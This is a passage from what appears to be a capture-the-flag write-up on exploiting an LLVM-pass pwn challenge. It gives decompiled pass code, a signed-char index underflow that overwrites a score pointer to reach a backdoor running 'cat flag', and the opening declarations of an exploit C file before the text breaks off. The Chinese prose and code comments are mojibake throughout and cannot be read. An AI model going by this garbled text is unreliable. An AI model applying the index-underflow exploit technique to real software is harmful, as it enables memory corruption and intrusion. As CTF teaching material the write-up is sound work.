weaponlist[k] += v45;</span><br><span class="line">  v19 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;upgrade finish&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v20 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;enjoy your war&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ç³»åˆ—å…³äºåŸç¥æ¢—çš„å‡½æ•°ï¼ˆåŸç¥<code>56</code>çº§ç©å®¶ï¼‰ï¼š  </p><img src="/2024/03/15/llvm/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹å‡ºè¿™ä¸€ç³»åˆ—å‡½æ•°å…è®¸æˆ‘ä»¬å¯¹<code>cmd</code>è¿™ä¸ªå…¨å±€å˜é‡è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è¿™å‡ ä¸ªå‡½æ•°çš„é¡ºåºè¿›è¡Œé€‚å½“çš„æ’åºå³å¯ä»¤<code>cmd</code>ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ®µä»£ç å°†<code>cmd</code>çš„å€¼è®¾ç½®ä¸º<code>&quot;cat flag&quot;</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tiandongwanxiang</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br><span class="line"><span class="built_in">guobapenhuo</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/03/15/llvm/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ¥ä¸‹æ¥æ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå½“å‡½æ•°çš„åå­—ä¸æ»¡è¶³ä¸Šè¿°çš„æ‰€æœ‰æ¡ä»¶åæ‰ä¼šæ‰§è¡Œä»¥ä¸‹è¿™æ®µä»£ç ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v36 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);<span class="comment">// è·å–å‡½æ•°çš„å‚æ•°ä¸ªæ•°</span></span><br><span class="line">  <span class="keyword">if</span> ( v36 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v35 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">  v37 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v35);<span class="comment">// è·å–å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">  v34 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">begin</span>(&amp;funMap[abi:cxx11]);<span class="comment">// v34ä¸ºmapçš„è¿­ä»£å™¨ï¼ŒæŒ‡å‘begin</span></span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// _Rb_tree_iteratorä¸ºçº¢é»‘æ ‘è¿­ä»£å™¨ï¼Œmapçš„åº•å±‚å³ä¸ºçº¢é»‘æ ‘</span></span><br><span class="line">    v32 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">    <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>!=(&amp;v34, &amp;v32) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;                        <span class="comment">// å¦‚æœè¿­ä»£å™¨åˆ°è¾¾mapçš„å°¾ç«¯ç€é€€å‡ºå¾ªç¯</span></span><br><span class="line">    v22 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);<span class="comment">// </span></span><br><span class="line">                                    <span class="comment">// å°†v34è¿™ä¸ªstd::pair&lt;std::string const,unsigned char&gt;ç±»å‹å¯¹è±¡èµ‹å€¼ç»™v22</span></span><br><span class="line">    <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// v58ä¸ºå‡½æ•°å</span></span><br><span class="line">    &#123;                               <span class="comment">// mapä¸­å­˜åœ¨è¯¥å‡½æ•°å</span></span><br><span class="line">      v23 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">              &amp;std::cout,</span><br><span class="line">              <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v24 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);</span><br><span class="line">      weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">0x20</span>);<span class="comment">// å°†valueèµ‹å€¼ç»™weaponlistï¼Œæ¼æ´å‡ºç°çš„åœ°æ–¹</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v33;                          <span class="comment">// ç”¨äºè®°å½•mapä¸­å·²ç»å­˜åœ¨çš„å‡½æ•°ä¸ªæ•°</span></span><br><span class="line">    v31[<span class="number">1</span>] = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v34, <span class="number">0LL</span>);</span><br><span class="line">    <span class="comment">// å°†v34è¿­ä»£å™¨å‘å‰æ¨è¿›ä¸€ä¸ªä½ç½®</span></span><br><span class="line">  &#125;</span><br><span class="line">  v31[<span class="number">0</span>] = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">  <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>==(&amp;v34, v31) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// å½“å‰å‡½æ•°ä¸å­˜åœ¨mapä¸­ï¼Œè¾“å‡º</span></span><br><span class="line">    v25 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;wow!! you find a new weapon&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v25, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v37;</span><br><span class="line">  v29[<span class="number">0</span>] = llvm::Value::<span class="built_in">getName</span>(CalledFunction);<span class="comment">// è·å–å‡½æ•°å</span></span><br><span class="line">  v29[<span class="number">1</span>] = v26;                     <span class="comment">// å¤„ç†å‡½æ•°çš„å‚æ•°</span></span><br><span class="line">  llvm::<span class="function">StringRef::<span class="keyword">operator</span> <span class="title">std::string</span><span class="params">(v30, v29)</span></span>;<span class="comment">// å°†v29è½¬æ¢ä¸ºStringRefç±»å‹å¯¹è±¡åå­˜å‚¨åœ¨v30ä¸­</span></span><br><span class="line">  *(_BYTE *)std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;funMap[abi:cxx11], v30) = v28;<span class="comment">// å°†è¯¥å‡½æ•°æ’å…¥mapä¸­</span></span><br><span class="line">  std::string::~<span class="built_in">string</span>(v30);</span><br><span class="line">&#125;</span><br><span class="line">std::string::~<span class="built_in">string</span>(v58);</span><br></pre></td></tr></table></figure><p>ç”±äºæ¯”è¾ƒé‡è¦ï¼Œæ‰€ä»¥ä»£ç ä¸­å†™äº†å¾ˆå¤šæ³¨é‡Šï¼Œä¸‹é¢å°±åªè®²è®²å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ï¼š<br>ä»£ç ä¸­éå†çš„æ—¶å€™æ˜¯æŒ‰ç…§å‡½æ•°åå¤§å°éå†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åˆ©ç”¨è¯¥æ®µä»£ç çš„æ—¶å€™è¦æ³¨æ„å‡½æ•°çš„å‘½å<br>æ¼æ´å‡ºç°åœ¨<code>weaponlist[v33] = *(_BYTE *)(v24 + 0x20);</code>è¿™ä¸€æ®µä»£ç <br>è¯¥<code>weaponlist</code>æ•°ç»„æ˜¯é€šè¿‡<code>char</code>ç±»å‹çš„<code>v33</code>è¿›è¡Œç´¢å¼•çš„ï¼Œè€Œæœ‰ç¬¦å·<code>char</code>ç±»å‹çš„èŒƒå›´æ˜¯<code>-128 ~ +127</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“<code>v33</code>çš„å€¼ä¸º<code>127</code>æ—¶ï¼Œæ­¤æ—¶åŠ <code>1</code>ï¼Œ<code>v33</code>çš„å€¼ä¼šå˜æˆ<code>-128</code>è€Œä¸æ˜¯<code>128</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹æ¥é€ æˆæ•°ç»„åæº¢æ¥ä¿®æ”¹åé¢çš„å€¼<br>åœ¨<code>weaponlist</code>æ•°ç»„åå­˜åœ¨çš„æ•°æ®ï¼š  </p><img src="/2024/03/15/llvm/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§<code>score</code>æŒ‡é’ˆå°±åœ¨å…¶åé¢ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„åæº¢æ¥æ”¹å†™<code>score</code>æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¾ˆå¤§çš„å€¼çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ä½¿ç”¨<code>fight</code>å‡½æ•°æ—¶å°±å¯ä»¥æ»¡è¶³<code>backdoor</code>å‡½æ•°çš„è°ƒç”¨æ¡ä»¶ä»è€Œè¿›å…¥<code>backdoor</code>å‡½æ•°ï¼Œè€Œ<code>cmd</code>å·²ç»åœ¨å‰é¢è¢«æˆ‘ä»¬æ”¹å†™æˆ<code>&quot;cat flag&quot;</code>ï¼Œæ‰€ä»¥è¿›å…¥<code>backdoor</code>å‡½æ•°åæˆ‘ä»¬å³å¯è·å¾—<code>flag</code><br>å®Œæ•´<code>exp</code>å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux000</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux001</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux002</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux003</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux004</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux005</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux006</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux007</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux008</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux009</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux010</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux011</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux012</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux013</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux014</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux015</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux016</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux017</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux018</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux019</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux020</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux021</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux022</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux023</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux024</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux025</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux026</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux027</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux028</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux029</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux030</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux031</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux032</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux033</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux034</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux035</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux036</span><span 